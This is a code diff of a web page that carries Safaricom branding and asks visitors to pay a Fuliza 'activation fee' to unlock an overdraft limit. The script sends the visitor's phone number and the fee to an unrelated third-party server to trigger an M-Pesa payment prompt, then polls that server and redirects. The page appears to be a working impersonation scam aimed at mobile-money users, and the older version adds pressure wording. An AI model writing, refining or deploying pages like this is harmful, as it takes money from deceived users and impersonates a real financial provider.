@@ -4,158 +4,177 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Activate Your Fuliza Limit</title>
+
 <style>
-body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
-.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
-.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
-.info{margin:10px 0;font-size:16px;}
-input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;box-sizing:border-box;}
-.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
-.pay-btn:hover{background:#179937;}
-.spinner{margin-top:15px;display:none;}
-.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-.message{margin-top:15px;font-size:14px;line-height:1.4;word-break:break-word;}
-.encourage{margin-top:20px;font-size:14px;color:#555;}
+body{font-family:Arial;background:#f4f6f9;margin:0}
+.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px}
+.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center}
+.info{margin:10px 0;font-size:16px}
+input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px}
+.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer}
+.pay-btn:hover{background:#179937}
+.spinner{margin-top:15px;display:none}
+.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.message{margin-top:15px;font-size:14px}
 </style>
 </head>
+
 <body>
 
 <header class="top-bar">Safaricom Fuliza Activation</header>
 
 <div class="payment-box">
-<h2>Activate Your Fuliza Limit Now</h2>
 
-<p class="encourage">
-Pay your activation fee today to unlock your desired Fuliza limit instantly. Ensure uninterrupted transactions and enjoy seamless access to your funds. Your financial freedom is just one click away!
-</p>
+<h2>Activate Your Fuliza Limit</h2>
 
 <div class="info">Selected Limit: <strong id="limit"></strong></div>
 <div class="info">Activation Fee: <strong id="fee"></strong></div>
 
-<input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
+<input type="tel" id="phone" placeholder="Enter Safaricom Number">
 
-<button class="pay-btn" id="main-pay-btn" onclick="payNow()">Pay Activation Fee Now</button>
+<button class="pay-btn" onclick="payNow()">Pay Activation Fee</button>
 
-<div class="spinner" id="spinner"><div class="loader"></div></div>
+<div class="spinner" id="spinner">
+<div class="loader"></div>
+</div>
+
 <div class="message" id="message"></div>
 
-<p class="encourage">
-Make sure to complete the payment to enjoy your increased Fuliza limit immediately. This small investment secures your ability to transact freely without delays.
-</p>
 </div>
 
 <script>
-const selectedAmount = localStorage.getItem("selectedAmount");
-const activationFee = localStorage.getItem("activationFee");
-document.getElementById("limit").innerText = "KSh " + selectedAmount;
-document.getElementById("fee").innerText = "KSh " + activationFee;
 
-function isSafaricom(number){
-  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number) || /^2541[0-9]{8}$/.test(number);
-}
+const selectedAmount = localStorage.getItem("selectedAmount") || "5000";
+const activationFee = localStorage.getItem("activationFee") || "50";
 
-function formatPhone(number){
-  if(number.startsWith("07") || number.startsWith("01")){
-    return "254" + number.substring(1);
-  }
-  return number;
+document.getElementById("limit").innerText="KSh "+selectedAmount;
+document.getElementById("fee").innerText="KSh "+activationFee;
+
+function formatPhone(phone){
+if(phone.startsWith("07")) return "254"+phone.slice(1);
+if(phone.startsWith("01")) return "254"+phone.slice(1);
+return phone;
 }
 
 async function payNow(){
-  const phone = document.getElementById("phone").value.trim();
-  const msg = document.getElementById("message");
-  const spinner = document.getElementById("spinner");
-  const mainBtn = document.getElementById("main-pay-btn");
 
-  if(!phone){ msg.innerText="Enter your phone number"; msg.style.color="red"; return; }
-  if(!isSafaricom(phone)){ msg.innerText="Only Safaricom numbers allowed"; msg.style.color="red"; return; }
+const phoneInput=document.getElementById("phone").value.trim();
+const msg=document.getElementById("message");
+const spinner=document.getElementById("spinner");
 
-  const phoneToSend = formatPhone(phone);
-  spinner.style.display="block";
-  mainBtn.style.display="none";
-  msg.innerText="Initiating payment... please check your phone.";
-  msg.style.color="black";
-
-  // SET YOUR BACKEND URL HERE
-  const apiUrl ="https://mpayafrica-server.onrender.com";
-
-  try{
-    const res = await fetch(`${apiUrl}/stkpush`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        phone: phoneToSend,
-        amount: Number(activationFee),
-        reference: "FZA" + Date.now()
-      })
-    });
-    
-    const data = await res.json();
-    spinner.style.display="none";
-
-    if(data.success){
-      msg.innerText="STK Push sent ✅ Enter your M-Pesa PIN to confirm...";
-      msg.style.color="green";
-      checkPayment(data.reference || data.data?.reference, "payment2.html", apiUrl);
-    } else {
-      // DISPLAY DETAILED ERROR FROM BACKEND
-      const detail = data.message || "Request failed";
-      msg.innerText = "Payment failed to initiate: " + detail;
-      msg.style.color="red";
-      mainBtn.style.display="block";
-      mainBtn.innerText = "Retry Payment";
-    }
-  } catch(err){
-    spinner.style.display="none";
-    msg.innerText="Connection error: " + (err.message || "Check your internet and try again");
-    msg.style.color="red";
-    mainBtn.style.display="block";
-    mainBtn.innerText = "Retry Payment";
-  }
+if(!phoneInput){
+msg.innerText="Enter phone number";
+msg.style.color="red";
+return;
 }
 
-async function checkPayment(reference, nextPage, apiUrl){
-  const msg = document.getElementById("message");
-  const mainBtn = document.getElementById("main-pay-btn");
-  let attempts=0;
-  
-  const interval = setInterval(async ()=>{
-    attempts++;
-    if(attempts>40){ 
-      clearInterval(interval); 
-      msg.innerText="Payment timeout. We didn't receive confirmation. Please retry."; 
-      msg.style.color="red"; 
-      mainBtn.style.display="block";
-      mainBtn.innerText = "Retry Payment";
-      return; 
-    }
-    
-    try{
-      const res = await fetch(`${apiUrl}/receipt/${reference}`);
-      const data = await res.json();
-      if(data.success && data.receipt){
-        const status = data.receipt.status.toLowerCase();
-        if(status==="success"){
-          clearInterval(interval);
-          msg.innerText="Payment successful ✅ Processing your activation...";
-          msg.style.color="green";
-          // Redirect after a short delay to show success
-          setTimeout(()=>{window.location.href=nextPage},2500);
-        }
-        else if(status==="failed" || status==="cancelled" || status==="error"){
-          clearInterval(interval);
-          msg.innerText="Payment failed: " + (data.receipt.status_note || "Transaction was not completed.");
-          msg.style.color="red";
-          mainBtn.style.display="block";
-          mainBtn.innerText = "Retry Payment";
-        }
-      }
-    }catch(e){
-      // Silently continue polling on connection blips
-    }
-  },3000);
+const phone=formatPhone(phoneInput);
+
+spinner.style.display="block";
+msg.innerText="Sending STK Push...";
+msg.style.color="black";
+
+try{
+
+const res=await fetch("https://mpayafrica-server.onrender.com/stkpush",{
+
+method:"POST",
+headers:{"Content-Type":"application/json"},
+
+body:JSON.stringify({
+phone:phone,
+amount:Number(activationFee)
+})
+
+});
+
+const data=await res.json();
+
+spinner.style.display="none";
+
+if(data.success){
+
+const checkoutID=data.data.CheckoutRequestID;
+
+msg.innerText="STK Push sent. Enter your M-Pesa PIN.";
+msg.style.color="green";
+
+checkPayment(checkoutID);
+
+}else{
+
+msg.innerText="Payment failed: "+data.message;
+msg.style.color="red";
+
 }
+
+}catch(err){
+
+spinner.style.display="none";
+msg.innerText="Server error. Try again.";
+msg.style.color="red";
+
+}
+
+}
+
+async function checkPayment(reference){
+
+const msg=document.getElementById("message");
+
+let attempts=0;
+
+const interval=setInterval(async()=>{
+
+attempts++;
+
+if(attempts>25){
+clearInterval(interval);
+msg.innerText="Payment timeout. Please try again.";
+msg.style.color="red";
+return;
+}
+
+try{
+
+const res=await fetch("https://mpayafrica-server.onrender.com/receipt/"+reference);
+const data=await res.json();
+
+if(data.success){
+
+const status=data.receipt.status;
+
+if(status==="success"){
+
+clearInterval(interval);
+
+msg.innerText="Payment successful. Redirecting...";
+msg.style.color="green";
+
+setTimeout(()=>{
+window.location.href="payment2.html";
+},1500);
+
+}
+
+if(status==="failed"){
+
+clearInterval(interval);
+
+msg.innerText="Payment failed or cancelled.";
+msg.style.color="red";
+
+}
+
+}
+
+}catch(e){}
+
+},3000);
+
+}
+
 </script>
 
 </body>
